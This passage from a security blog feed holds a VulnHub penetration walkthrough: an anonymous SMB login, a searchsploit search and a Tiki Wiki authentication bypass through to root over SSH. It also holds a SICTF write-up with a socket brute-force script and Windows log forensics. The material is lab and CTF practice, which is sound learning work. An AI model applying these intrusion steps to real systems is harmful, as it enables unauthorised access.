6l       19w     1384c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdGhlbWVzL2Jhc2VfZmlsZXMvZmF2aWNvbnMvZmF2aWNvbi0xNngxNi5wbmc=\">http://192.168.85.145/tiki/themes/base_files/favicons/favicon-16x16.png</span><br>\n403      GET      393l     1324w    46811c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdGlraS1hZG1pbi5waHA=\">http://192.168.85.145/tiki/tiki-admin.php</span><br>\n404      GET      393l     1316w    46786c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdGlraS1hamF4X3NlcnZpY2VzLnBocA==\">http://192.168.85.145/tiki/tiki-ajax_services.php</span><br>\n200      GET      289l      995w     8317c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvbGliL2pxdWVyeV90aWtpL3BsdWdpbmVkaXQuanM=\">http://192.168.85.145/tiki/lib/jquery_tiki/pluginedit.js</span><br>\n200      GET       19l       76w     6061c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvaW1nL3Rpa2kvVGlraV9XQ0cucG5n\">http://192.168.85.145/tiki/img/tiki/Tiki_WCG.png</span><br>\n200      GET       70l      332w     4474c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2pxdWVyeS1wbHVnaW5zL2NvbG9yYm94L2V4YW1wbGUxL2NvbG9yYm94LmNzcw==\">http://192.168.85.145/tiki/vendor_bundled/vendor/jquery-plugins/colorbox/example1/colorbox.css</span><br>\n200      GET     2624l    11633w    88740c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL25wbS1hc3NldC9wb3BwZXIuanMvZGlzdC91bWQvcG9wcGVyLmpz\">http://192.168.85.145/tiki/vendor_bundled/vendor/npm-asset/popper.js/dist/umd/popper.js</span><br>\n200      GET       77l      293w     1848c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2pxdWVyeS1wbHVnaW5zL2FzeW5jL2pxdWVyeS5hc3luYy5qcw==\">http://192.168.85.145/tiki/vendor_bundled/vendor/jquery-plugins/async/jquery.async.js</span><br>\n200      GET      200l      803w     5256c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2pxdWVyeS1wbHVnaW5zL2pxdWVyeS1qc29uL3NyYy9qcXVlcnkuanNvbi5qcw==\">http://192.168.85.145/tiki/vendor_bundled/vendor/jquery-plugins/jquery-json/src/jquery.json.js</span><br>\n200      GET       50l      267w    18969c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdGhlbWVzL2Jhc2VfZmlsZXMvZmF2aWNvbnMvYXBwbGUtdG91Y2gtaWNvbi5wbmc=\">http://192.168.85.145/tiki/themes/base_files/favicons/apple-touch-icon.png</span><br>\n200      GET      130l      436w     5366c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2N3c3BlYXIvYm9vdHN0cmFwLWhvdmVyLWRyb3Bkb3duL2Jvb3RzdHJhcC1ob3Zlci1kcm9wZG93bi5qcw==\">http://192.168.85.145/tiki/vendor_bundled/vendor/cwspear/bootstrap-hover-dropdown/bootstrap-hover-dropdown.js</span><br>\n200      GET      935l     2838w    27000c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvbGliL2pxdWVyeV90aWtpL2ZpbGVzLmpz\">http://192.168.85.145/tiki/lib/jquery_tiki/files.js</span><br>\n200      GET       11l       16w      443c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdGhlbWVzL2Jhc2VfZmlsZXMvZmF2aWNvbnMvYnJvd3NlcmNvbmZpZy54bWw=\">http://192.168.85.145/tiki/themes/base_files/favicons/browserconfig.xml</span><br>\n200      GET       21l       37w      552c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdGhlbWVzL2Jhc2VfZmlsZXMvZmF2aWNvbnMvc2l0ZS53ZWJtYW5pZmVzdA==\">http://192.168.85.145/tiki/themes/base_files/favicons/site.webmanifest</span><br>\n200      GET    10872l    44287w   287630c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2NvbXBvbmVudHMvanF1ZXJ5L2pxdWVyeS5qcw==\">http://192.168.85.145/tiki/vendor_bundled/vendor/components/jquery/jquery.js</span><br>\n200      GET        8l       45w     3046c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdGhlbWVzL2Jhc2VfZmlsZXMvZmF2aWNvbnMvZmF2aWNvbi0zMngzMi5wbmc=\">http://192.168.85.145/tiki/themes/base_files/favicons/favicon-32x32.png</span><br>\n200      GET       30l      187w     1945c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2pxdWVyeS9qcXVlcnktdGltZXBpY2tlci1hZGRvbi9kaXN0L2pxdWVyeS11aS10aW1lcGlja2VyLWFkZG9uLmNzcw==\">http://192.168.85.145/tiki/vendor_bundled/vendor/jquery/jquery-timepicker-addon/dist/jquery-ui-timepicker-addon.css</span><br>\n200      GET       28l       67w      652c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2pxdWVyeS1wbHVnaW5zL3RyZWV0YWJsZS9jc3MvanF1ZXJ5LnRyZWV0YWJsZS5jc3M=\">http://192.168.85.145/tiki/vendor_bundled/vendor/jquery-plugins/treetable/css/jquery.treetable.css</span><br>\n200      GET       24l       90w      945c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvbGliL2pxdWVyeV90aWtpL3Rpa2ktYm9vdHN0cmFwbW9kYWxmaXguanM=\">http://192.168.85.145/tiki/lib/jquery_tiki/tiki-bootstrapmodalfix.js</span><br>\n200      GET      114l      597w     4938c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2pxdWVyeS1wbHVnaW5zL3N1cGVyZmlzaC9kaXN0L2pzL2hvdmVySW50ZW50Lmpz\">http://192.168.85.145/tiki/vendor_bundled/vendor/jquery-plugins/superfish/dist/js/hoverIntent.js</span><br>\n200      GET       61l      379w    24354c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdGhlbWVzL2Jhc2VfZmlsZXMvZmF2aWNvbnMvZmF2aWNvbi5pY28=\">http://192.168.85.145/tiki/themes/base_files/favicons/favicon.ico</span><br>\n200      GET     1372l     5516w    42878c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2pxdWVyeS1wbHVnaW5zL2pxdWVyeS12YWxpZGF0aW9uL2Rpc3QvanF1ZXJ5LnZhbGlkYXRlLmpz\">http://192.168.85.145/tiki/vendor_bundled/vendor/jquery-plugins/jquery-validation/dist/jquery.validate.js</span><br>\n200      GET     4420l    11447w   136323c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL3R3YnMvYm9vdHN0cmFwL2Rpc3QvanMvYm9vdHN0cmFwLmpz\">http://192.168.85.145/tiki/vendor_bundled/vendor/twbs/bootstrap/dist/js/bootstrap.js</span><br>\n200      GET      228l      866w     8083c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvbGliL3ZhbGlkYXRvcnMvdmFsaWRhdG9yX3Rpa2kuanM=\">http://192.168.85.145/tiki/lib/validators/validator_tiki.js</span><br>\n200      GET      540l     2164w    14923c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2NvbXBvbmVudHMvanF1ZXJ5LW1pZ3JhdGUvanF1ZXJ5LW1pZ3JhdGUuanM=\">http://192.168.85.145/tiki/vendor_bundled/vendor/components/jquery-migrate/jquery-migrate.js</span><br>\n200      GET      629l     1606w    16611c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdmVuZG9yX2J1bmRsZWQvdmVuZG9yL2pxdWVyeS1wbHVnaW5zL3RyZWV0YWJsZS9qcXVlcnkudHJlZXRhYmxlLmpz\">http://192.168.85.145/tiki/vendor_bundled/vendor/jquery-plugins/treetable/jquery.treetable.js</span><br>\n200      GET      421l     1343w    47118c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdGlraS1yZW1pbmRfcGFzc3dvcmQucGhw\">http://192.168.85.145/tiki/tiki-remind_password.php</span><br>\n200      GET     5026l    13357w   119973c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvdGhlbWVzL2Jhc2VfZmlsZXMvY3NzL3Rpa2lfYmFzZS5jc3M=\">http://192.168.85.145/tiki/themes/base_files/css/tiki_base.css</span><br>\n200      GET     1654l     5876w    47509c <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1L3Rpa2kvbGliL3Rpa2ktanMuanM=\">http://192.168.85.145/tiki/lib/tiki-js.js</span></p>\n</blockquote>\n<p>关于 robot.txt 内容为</p>\n<blockquote>\n<p>HTTP/1.1 200 OK<br>\nDate: Sat, 24 Feb 2024 12:32:51 GMT<br>\nServer: Apache/2.4.41 (Ubuntu)<br>\nLast-Modified: Wed, 29 Jul 2020 11:21:37 GMT<br>\nETag: “2a-5ab92c25233cd”<br>\nAccept-Ranges: bytes<br>\nContent-Length: 42<br>\nContent-Type: text/plain</p>\n<p>User-Agent: *<br>\nDisallow:<br>\nDisallow: /tiki/(可访问)</p>\n</blockquote>\n<h4 id=\"收集smb端口信息\"><a class=\"markdownIt-Anchor\" href=\"#收集smb端口信息\">#</a> 收集 SMB 端口信息</h4>\n<p>SMB(445// <code>SMB端口139或445</code> ) 可以读到 Mail.txt</p>\n<blockquote>\n<p>SMB 端口由于 autorecon 可以直接读到一些有用的信息，那么我们可以考虑用波 smbclient 进行连接密码为空登录成功以后可以用 get 下载到本地</p>\n</blockquote>\n<blockquote>\n<p>命令:smbclient [\\\\ip\\](file:///\\\\ip\\) 目录</p>\n</blockquote>\n<p><img data-src=\"/img/TIKI_1/image-20240224211218129.png\" alt=\"image-20240224211218129\"></p>\n<h4 id=\"挖掘80端口信息\"><a class=\"markdownIt-Anchor\" href=\"#挖掘80端口信息\">#</a> 挖掘 80 端口信息</h4>\n<blockquote>\n<p>robots.txt 下禁止的 tiki 是能够被访问的</p>\n</blockquote>\n<p><img data-src=\"/img/TIKI_1/image-20240224211603341.png\" alt=\"image-20240224211603341\"></p>\n<p>一个 CMS</p>\n<p>用前面得到的密码去登陆</p>\n<p><img data-src=\"/img/TIKI_1/image-20240224212003782.png\" alt=\"image-20240224212003782\"></p>\n<p>登陆成功</p>\n<h4 id=\"收集cms信息\"><a class=\"markdownIt-Anchor\" href=\"#收集cms信息\">#</a> 收集 CMS 信息</h4>\n<p>既然我们目前知道了 CMS 的名字是 tiki wiki, 我们首先需要确定版本才能找到相关漏洞根据 CMS 官网和靶机发布时间为 20207 月大概推断该 CMS 版本为 21</p>\n<p><img data-src=\"/img/TIKI_1/image-20240224212749163.png\" alt=\"image-20240224212749163\"></p>\n<p>也可以加上 changelog.txt</p>\n<p><img data-src=\"/img/TIKI_1/image-20240224212958681.png\" alt=\"image-20240224212958681\"></p>\n<h4 id=\"搜索相关payload\"><a class=\"markdownIt-Anchor\" href=\"#搜索相关payload\">#</a> 搜索相关 payload</h4>\n<p>确定完版本号后得找找相关漏洞可以在 kali 本地下直接搜关键词 searchsploit Tiki Wiki 21 找到一个相关的绕过漏洞</p>\n<blockquote>\n<p>┌──(root ㉿ kali)-[/home/kali/Desktop/Tools/AutoRecon]<br>\n└─# searchsploit Tiki Wiki 21</p>\n<blockquote></blockquote>\n<hr>\n<p>Exploit Title                                                                                                                                                                   |  Path</p>\n<hr>\n<p>Tiki Wiki CMS Groupware - ‘url’ Open Redirection                                                                                                                                 | php/webapps/36848.txt<br>\nTiki Wiki CMS Groupware 21.1 - Authentication Bypass                                                                                                                             | php/webapps/48927.py<br>\nTikiWiki jhot - Remote Command Execution (Metasploit)                                                                                                                            | php/webapps/16885.rb<br>\nTikiWiki Project 1.8 - ‘tiki-browse_categories.php?sort_mode’ SQL Injection                                                                                                      | php/webapps/23966.txt<br>\nTikiWiki Project 1.8 - ‘tiki-directory_ranking.php?sort_mode’ SQL Injection                                                                                                      | php/webapps/23965.txt<br>\nTikiWiki Project 1.8 - ‘tiki-directory_search.php?sort_mode’ SQL Injection                                                                                                       | php/webapps/23973.txt<br>\nTikiWiki Project 1.8 - ‘tiki-file_galleries.php?sort_mode’ SQL Injection                                                                                                         | php/webapps/23974.txt<br>\nTikiWiki Project 1.8 - ‘tiki-index.php?comments_offset &amp; offset’ SQL Injections                                                                                                  | php/webapps/23971.txt<br>\nTikiWiki Project 1.8 - ‘tiki-list_file_gallery.php?sort_mode’ SQL Injection                                                                                                      | php/webapps/23964.txt<br>\nTikiWiki Project 1.8 - ‘tiki-list_trackers.php?sort_mode’ SQL Injection                                                                                                          | php/webapps/23976.txt<br>\nTikiWiki Project 1.8 - ‘tiki-usermenu.php?sort_mode’ SQL Injection                                                                                                               | php/webapps/23963.txt<br>\nTikiWiki Project 1.8 - ‘tiki-user_tasks.php?offset &amp; sort_mode’ SQL Injections                                                                                                   | php/webapps/23972.txt<br>\nTikiWiki Project 1.8 - ‘tiki-view_chart.php?chartId’ Cross-Site Scripting                                                                                                        | php/webapps/23962.txt</p>\n<hr>\n<p>Shellcodes: No Results</p>\n</blockquote>\n<p><img data-src=\"/img/TIKI_1/image-20240224214218291.png\" alt=\"image-20240224214218291\"></p>\n<p>接着就按照脚本的方法在登录处用 admin 登录然后用 Burp 抓包就可</p>\n<p><img data-src=\"/img/TIKI_1/image-20240224220259251.png\" alt=\"image-20240224220259251\"></p>\n<p><img data-src=\"/img/TIKI_1/image-20240224220316300.png\" alt=\"image-20240224220316300\"></p>\n<p><img data-src=\"/img/TIKI_1/image-20240224220334412.png\" alt=\"image-20240224220334412\"></p>\n<h4 id=\"提权\"><a class=\"markdownIt-Anchor\" href=\"#提权\">#</a> 提权</h4>\n<p>发现 Credentials</p>\n<p><img data-src=\"/img/TIKI_1/image-20240224220751042.png\" alt=\"image-20240224220751042\"></p>\n<p>点进去有个账号后面的字符串明显不同于前面的 Mail.txt 的内容</p>\n<p><img data-src=\"/img/TIKI_1/image-20240224220944680.png\" alt=\"image-20240224220944680\"></p>\n<p>有个不同于 silky 的账号</p>\n<p>使用 ssh 连接</p>\n<blockquote>\n<p>ssh   silky@<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguODUuMTQ1\">http://192.168.85.145</span></p>\n</blockquote>\n<p>用 SSH 连接以后输入账号密码成功登录。用 sudo -l 查看权限跟 root 一样高直接 su 就可。</p>\n<p><img data-src=\"/img/TIKI_1/image-20240224221412482.png\" alt=\"image-20240224221412482\"></p>\n<blockquote>\n<p>心得：</p>\n<p>学习了不少工具方法和端口协议，坚持坚持！！！</p>\n</blockquote>\n",
            "tags": [
                "靶机渗透",
                "vulnHUB"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/02/19/Sictf-round3-wp/",
            "url": "https://yhuanhuan01.github.io/2024/02/19/Sictf-round3-wp/",
            "title": "Sictf-round3-wp",
            "date_published": "2024-02-19T04:33:34.000Z",
            "content_html": "<h1 id=\"sictf-round3-wp\"><a class=\"markdownIt-Anchor\" href=\"#sictf-round3-wp\">#</a> SICTF-round3-wp</h1>\n<p>题解：</p>\n<h3 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h3>\n<h4 id=\"geekchallege\"><a class=\"markdownIt-Anchor\" href=\"#geekchallege\">#</a> GeekChallege</h4>\n<blockquote>\n<p>最终分数 269 pts</p>\n</blockquote>\n<blockquote>\n<p>我的密码可是很长的呢！（nc）</p>\n</blockquote>\n<blockquote>\n<p>Rule:If the i-th character of the string you input is the same as the i-th character of my password, I will output a 1. Otherwise, I will output a 0. Keep guessing my password until you get it right, and I will give you flag</p>\n<p>Tip:len(array)=5&amp;&amp;len(passwd)=114</p>\n</blockquote>\n<p>已知规则为爆破密码，密码为 5 位长度的数组构成的 114 个密码</p>\n<p>所以先进行爆破数组，然后就可以快速爆破密码</p>\n<p>脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>HOST <span class=\"token operator\">=</span> <span class=\"token string\">'yuanshen.life'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>PORT <span class=\"token operator\">=</span> <span class=\"token number\">33615</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>characters <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>printable</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>password <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'?'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">114</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>known_chars <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">with</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  s<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>HOST<span class=\"token punctuation\">,</span> PORT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  banner <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">114</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>known_chars<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      chars <span class=\"token operator\">=</span> known_chars</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      chars <span class=\"token operator\">=</span> characters</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">for</span> char <span class=\"token keyword\">in</span> chars<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            attempt <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'?'</span><span class=\"token punctuation\">,</span> char<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            s<span class=\"token punctuation\">.</span>sendall<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>attempt <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            response <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">114</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                part <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                response <span class=\"token operator\">+=</span> part<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"TEST: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>attempt<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -> </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>response<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token keyword\">if</span> response<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                password<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> char</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                known_chars<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"FOUND </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>char<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> at </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Password:\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>result <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h4 id=\"whowhowho\"><a class=\"markdownIt-Anchor\" href=\"#whowhowho\">#</a> WHO?WHO?WHO</h4>\n<blockquote>\n<p>最终分数 438 pts</p>\n</blockquote>\n<blockquote>\n<p>题目描述：我不说是谁了！！！太渣了！！！呜呜呜！！！让我遍体鳞伤！！！</p>\n<p>压缩包密码为 6 位小写字母</p>\n<p>树木是渣男</p>\n</blockquote>\n<p>压缩包密码 6 位小写</p>\n<blockquote>\n<p>qweqwe</p>\n</blockquote>\n<p>得到文本内容，零宽</p>\n<blockquote>\n<p>U2FsdGVkX19uvldJ6CGUNff3B28QEdIjZqgUh98K+/0J16ELU8WVQydohw4P5+2M<br>\njbhTLQHNOpcoOd7kSRgy8pwpovCmimdD8M0IbYUeXjNKYePL/WP4PCMaOJHAW3HR<br>\nb7IEoDDH1NYh3o5NwMmcFEqy1ujf72VgQIQkaeYFFFE=</p>\n</blockquote>\n<p>兔子解密</p>\n<p>密钥 shumu</p>\n<blockquote GGGTCACGGTTC_GGGTCACGGTTC_GAACGGTTC_GTAGTG_GCTTCA_GTAGACGTGGCGGTG_GTAGACTCA_TATGACCGG_GCTCGGGCT=\"\">\n<p>GTAGAGCTAGTCCTT</p>\n</blockquote>\n<p>DNA 加密</p>\n<blockquote Q1A0_Q1A0_GA0_SU_N1_SHUMU_SH1_ZHA_NAN=\"\">\n<p>SICTF</p>\n</blockquote>\n<h4 id=\"日志分析1\"><a class=\"markdownIt-Anchor\" href=\"#日志分析1\">#</a> 日志分析 1</h4>\n<blockquote>\n<p>最终分数 703 pts</p>\n</blockquote>\n<blockquote>\n<p>可恶的树魔王黑客居然控制了我的电脑，聪明的你一定能够识破树魔王的阴谋吧！<br>\nflag 格式为 SICTF {黑客所接入的 IP 地址 | 黑客所创建的用户名 | 黑客所加入的用户组 | 黑客创建的计划名 | 创建计划任务的对象后门所处的路径（小写盘符…, 后门路径精确到 ****.exe）| 黑客远程登陆 RDP 的账户}<br>\n 后门路径精确到 ****.exe</p>\n<p>后门路径精确到 ****.exe</p>\n<p>注意 system 的权限</p>\n<p>远程登录账户请加上用户域 (xxxxxxx\\xxxxxxx)</p>\n</blockquote>\n<p>所用工具</p>\n<blockquote>\n<p>Log Parser Lizard （需要自行设置 Maps 路径）</p>\n<p>windows 自带日志工具</p>\n</blockquote>\n<blockquote>\n<p>黑客所接入的 IP 地址</p>\n</blockquote>\n<p>payload data2 中搜索 Logon Type 10 (远程 rdp 连接)</p>\n<p>找到 Remote Host 为  WIN-WH8G5MDPHE5 (192.168.222.200)</p>\n<p>所以 IP 为 192.168.222.200</p>\n<blockquote>\n<p>黑客所创建的用户名</p>\n</blockquote>\n<p>Map Description 中搜索 A new account was created 或者在 Event ID 找 4720</p>\n<p>发现只有一条创建用户操作</p>\n<p>Target: ADOFLMB\\attack$ (S-1-5-21-867333373-202576419-2389709931-1103)</p>\n<p>所以用户为 attack$</p>\n<blockquote>\n<p>黑客所加入的用户组</p>\n</blockquote>\n<p>Map Description 中搜索 A member was added to a security-enabled local group 或者在 Event ID 找 4732</p>\n<p>只有一条记录</p>\n<p>payload data1 为 Target: Builtin\\Administrators (S-1-5-32-544)</p>\n<p>payload data4 为 MemberSid: S-1-5-21-867333373-202576419-2389709931-1103</p>\n<p>由前面可知 attack$ 的 SSID 为 S-1-5-21-867333373-202576419-2389709931-1103</p>\n<p>所以加入的用户组为 Administrators</p>\n<blockquote>\n<p>黑客创建的计划名</p>\n</blockquote>\n<p>Map Description 中搜索 Scheduled Task created 或者在 Event ID 找 4698</p>\n<p>只有一条记录</p>\n<p>payload data1 为 TaskName: \\callback</p>\n<p>所以创建的计划名为 callback</p>\n<blockquote>\n<p>创建计划任务的对象后门所处的路径（小写盘符…, 后门路径精确到 ****.exe）</p>\n</blockquote>\n<p>仍然是 4698</p>\n<p>在 payload 2 中发现计划内容</p>\n<p>其中后门路径为 c:\\windows\\system32\\windows_attack.exe</p>\n<blockquote>\n<p>黑客远程登陆 RDP 的账户 